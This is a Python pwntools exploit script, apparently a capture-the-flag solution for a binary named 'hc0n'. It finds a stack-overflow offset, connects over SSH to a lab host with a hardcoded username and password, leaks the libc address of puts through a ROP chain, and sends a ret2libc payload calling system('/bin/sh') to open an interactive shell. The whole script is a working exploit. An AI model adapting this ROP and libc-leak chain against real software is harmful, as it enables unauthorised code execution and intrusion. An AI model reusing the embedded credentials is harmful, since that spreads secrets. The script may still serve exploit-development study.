#!/usr/bin/env python3

from pwn import *
path = './hc0n'
max_buf = 120

#context.log_level = "DEBUG"
context.binary=path
elf = ELF(path)

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
rop = ROP(elf)

# Calcular offest
buf = cyclic(max_buf, n=8)
r = process(path)
r.sendlineafter('(: \n\n', buf)
r.wait()
core = Coredump('./core')
fault_addr = core.fault_addr
offset = cyclic_find(fault_addr, n=8)
success("offset: " + str(offset))
#r = process(path)

shell = ssh('thedarktangent', '10.10.22.159', password='Gf7MRr55n$@#PDuliL', port=22)
r = shell.run('/home/thedarktangent/hc0n')
junk = b'A' * offset

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
info('puts_got = ' + hex(puts_got))
info('puts_plt = ' + hex(puts_plt))
main = elf.sym['main']
info("main: "+hex(main))

pop_rdi = rop.rdi[0]
info("pop_rdi: "+hex(pop_rdi))

payload_for_leak = junk + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendlineafter('(: \n\n', payload_for_leak)
puts_leak = u64(r.recvline()[:-1].ljust(8, b'\x00'))

success('Leaked puts address: ' + hex(puts_leak))

puts_offset = libc.sym['puts']
info("puts_offset: "+hex(puts_offset))
system_offset = libc.sym['system'] #local

info("system_offset: "+hex(system_offset))
bin_sh_offset = next(libc.search(b"/bin/sh"))

info("/bin/sh offset: "+hex(bin_sh_offset))
libc_base = puts_leak - puts_offset
info("libc base address: "+hex(libc_base))

system = libc_base + system_offset
sh = libc_base + bin_sh_offset

#Para una salida mas limpia.
exit = p64(libc.sym['exit'] + libc_base)
payload = junk + p64(pop_rdi) + p64(sh) + p64(system) + exit
r.sendlineafter('(: \n\n',payload)
r.interactive()
r.close()
